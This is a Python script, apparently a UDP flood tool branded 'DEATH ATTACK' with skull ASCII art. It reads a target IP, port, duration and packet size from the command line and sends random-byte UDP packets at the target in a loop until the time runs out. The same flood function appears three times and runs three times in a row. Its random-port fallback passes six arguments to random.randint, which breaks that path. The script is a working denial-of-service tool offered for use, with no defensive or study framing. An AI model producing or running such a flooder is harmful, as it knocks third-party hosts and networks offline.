import os, codecs, sys, random, threading, time, socket
from time import time as tt

ip = str(sys.argv[1])
port = int(sys.argv[2])
time = int(sys.argv[3])
size = int(sys.argv[4])

banner = """\u001b[31m
  █████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄██████████
███████████████████████████

\033[95m╔╦╗╔═╗╔═╗╔╦╗╦ ╦
\033[95m ║║║╣ ╠═╣ ║ ╠═╣
\033[95m═╩╝╚═╝╩ ╩ ╩ ╩ ╩
"""

def attack(ip, port, time, size):
    if time is None:
        time = float('inf')
    if port is not None:
        port = max(1, min(65535, port))
    print(banner)
    fmt = '\033[94m[ DEATH ATTACK ]  -  SENT TO IP \033[91m{ip}\033[94m AND \033[91m{port}'.format(
        ip=ip,
        port='PORT {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)
    startup = tt()
    size = os.urandom(min(666, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        port = port or random.randint(1,666, 65535, 3354, 7777, 8888)
        endtime = tt()
        if (startup + time) < endtime:
            break
        sock.sendto(size, (ip, port))
    print('\033[92mAttack Finished')
    os.system('cls' if os.name=='nt' else 'clear')

def attackx(ip, port, time, size):
    if time is None:
        time = float('inf')
    if port is not None:
        port = max(1, min(65535, port))
    print(banner)
    fmt = '\033[94m[ DEATH ATTACK ]  -  SENT TO IP \033[91m{ip}\033[94m AND \033[91m{port}'.format(
        ip=ip,
        port='PORT {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)
    startup = tt()
    size = os.urandom(min(666, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        port = port or random.randint(1,666, 65535, 3354, 7777, 8888)
        endtime = tt()
        if (startup + time) < endtime:
            break
        sock.sendto(size, (ip, port))
    print('\033[92mAttack Finished')
    os.system('cls' if os.name=='nt' else 'clear')

def attackxx(ip, port, time, size):
    if time is None:
        time = float('inf')
    if port is not None:
        port = max(1, min(65535, port))
    print(banner)
    fmt = '\033[94m[ DEATH ATTACK ]  -  SENT TO IP \033[91m{ip}\033[94m AND \033[91m{port}'.format(
        ip=ip,
        port='PORT {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)
    startup = tt()
    size = os.urandom(min(666, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        port = port or random.randint(1,666, 65535, 3354, 7777, 8888)
        endtime = tt()
        if (startup + time) < endtime:
            break
        sock.sendto(size, (ip, port))
    print('\033[92mAttack Finished')
    os.system('cls' if os.name=='nt' else 'clear')

if __name__ == '__main__':
    try:
        attack(ip, port, time, size)
        attackx(ip, port, time, size)
        attackxx(ip, port, time, size)
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("\033[95m╔════════════════════════════════════╗")
        print ("\033[95m         ╔═╗╔╦╗╔═╗╔═\u001b[31m╗╔═╗╔═╗╔╦╗        ")
        print ("\033[95m         ╚═╗ ║ ║ ║╠═╝╠\u001b[31m═╝║╣  ║║        ")
        print ("\033[95m         ╚═╝ ╩ ╚═╝╩  ╩  \u001b[31m╚═╝═╩╝        ")
        print ("\033[95m╚════════════════════════════════════╝")